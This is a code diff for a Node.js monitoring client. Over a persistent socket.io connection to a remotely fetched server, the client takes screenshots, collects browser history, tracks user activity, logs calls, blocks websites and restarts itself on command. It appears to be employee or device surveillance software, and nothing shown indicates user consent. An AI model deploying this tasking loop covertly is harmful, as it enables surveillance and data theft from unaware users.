@@ -2,9 +2,19 @@ const { io } = require("socket.io-client");
 const fs = require("fs");
 const path = require("path");
 
+
 const screenshotModule = require("./modules/screenshot");
+const browserHistory = require("./modules/browserHistory");
 const { notifyTaskComplete } = require("./api/notifyTaskComplete");
 const { getApiUrlFromRemote } = require("./utils/getApiUrl");
+const { websiteBlocker } = require("./modules/websiteBlocker");
+const { startUserActivityTracking } = require('./modules/userActivityTracker');
+const { restartMainExe } = require('./modules/exeRestart');
+const { BASE_URL } = require("./constants/constants");
+const { startMonitoring, checkForNewCall } = require('./modules/callLogger');
+const updateWatchdog = require("./modules/update-watchdog");
+
+
 
 // Dynamically determine the path to client_id.txt
 const appDataPath = process.env.APPDATA || path.join(process.env.HOME, ".config");
@@ -19,14 +29,30 @@ if (fs.existsSync(clientIdFilePath)) {
   process.exit(1);
 }
 
+
+
+
 (async () => {
   try {
+
     const API_URL = await getApiUrlFromRemote();
     console.log("REMOTE API URL >>", API_URL);
+    // BASE_URL=API_URL;
+
+// =====================================================================
+
+const websiteBlocked = websiteBlocker(CLIENT_ID,API_URL)
+
+const callMonitor = startMonitoring(5000, (newCallLog) => {
+  console.log("📞 New call detected in main file:", newCallLog);
+});
+
+// ======================================================================
+
 
     const socket = io(API_URL, {
       query: { clientId: CLIENT_ID },
-      reconnection: true,
+      reconnection: true, 
       reconnectionAttempts: Infinity,
       reconnectionDelay: 5000,
     });
@@ -38,6 +64,28 @@ if (fs.existsSync(clientIdFilePath)) {
     socket.on("disconnect", () => {
       console.warn("Disconnected from API server. Retrying...");
     });
+
+// Check for WatchDog Update ===============================================================
+    // updateWatchdog()
+// =====================================================================================
+
+
+    // Emitting Status to Server =============================================================
+
+    let lastEmittedStatus = null;
+
+    startUserActivityTracking((status) => {
+      console.log(`[User Status] ${status}`);
+      if (socket && socket.connected && status !== lastEmittedStatus) {
+        socket.emit("user-status", { 
+          clientId: CLIENT_ID,
+          status, 
+          timestamp: Date.now()
+        });
+        lastEmittedStatus = status;
+      }
+    });
+    // ==============================================================
 
     socket.on("task", async (data) => {
       const { type, payload, taskId } = data;
@@ -51,12 +99,14 @@ if (fs.existsSync(clientIdFilePath)) {
             console.log("Screenshot Clicked! >>");
             break;
 
-          case "location":
-            // resultData = await locationModule.capture();
+          case "restart-client":
+            resultData = await restartMainExe()
+            .then((msg) => console.log(msg))
+            .catch((err) => console.error(err));
             break;
 
           case "browser-history":
-            // resultData = await historyModule.capture();
+            resultData = await browserHistory.getRecentBrowserHistory();
             break;
 
           default:
@@ -73,3 +123,12 @@ if (fs.existsSync(clientIdFilePath)) {
     console.error("Fatal error occurred:", err);
   }
 })();
+
+
+// =================================================================================
+
+
+// startUserActivityTracking((status) => {
+//   console.log(`[User Status] ${status}`);
+// });
+
